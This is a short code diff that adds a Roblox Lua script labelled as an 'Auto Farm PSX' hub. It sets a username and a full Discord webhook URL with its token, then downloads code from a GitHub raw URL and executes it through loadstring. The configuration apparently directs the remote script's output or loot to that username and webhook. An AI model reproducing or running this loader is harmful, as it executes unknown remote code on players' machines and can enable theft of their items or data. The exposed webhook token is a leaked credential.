@@ -1,0 +1,6 @@
+
+_G.Username = "ShilohDynasty" 
+_G.HubName = "Auto Farm PSX"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1105516923761995816/n1iYYwCmsuCEpYPwjpgWCh-xI6Xc-9TRqfcsvmNQQ9NYq64bwhnqGugcBCcPPlUUA2-n"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
